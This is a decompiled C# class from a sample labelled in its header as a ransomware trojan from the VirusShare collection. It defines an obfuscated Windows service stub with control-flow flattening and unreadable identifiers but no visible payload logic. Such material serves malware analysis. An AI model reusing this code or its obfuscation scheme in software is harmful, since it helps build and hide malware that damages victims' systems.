// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႣႥ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System.ComponentModel;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႣႥ : ServiceBase
  {
    internal static byte[] Ⴄ;
    private IContainer Ⴗ;

    public ႣႥ() => this.Ⴓ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
            goto label_9;
          case 2:
            goto label_10;
          case 3:
            goto label_11;
          case 5:
            goto label_8;
          case 6:
            num1 = this.Ⴗ == null ? (int) ⴐ[96] / 9 : (int) ⴐ[103];
            continue;
          default:
            int num2;
            if (obj0)
              num2 = 6;
            else
              goto label_5;
label_4:
            num1 = num2;
            continue;
label_5:
            int num3 = (int) ⴍ[111];
            ႷႨ.Ⴐ[464] = (byte) ((int) ႷႨ.Ⴐ[464] * (int) ႷႼ.Ⴗ[12] & 143);
            num2 = num3 - 15;
            goto label_4;
        }
      }
label_9:
      return;
label_10:
      return;
label_11:
      return;
label_7:
      this.Ⴗ.Dispose();
label_8:
      base.Dispose(obj0);
    }

    private void Ⴓ()
    {
      this.Ⴗ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႣႷ), 13L, 3, 1951761542), (short) 624, 'Ș');
    }

    static ႣႥ()
    {
      ႳႣ.Ⴅ();
      ႣႥ.Ⴄ = ႳႼ.Ⴈ();
    }
  }
}
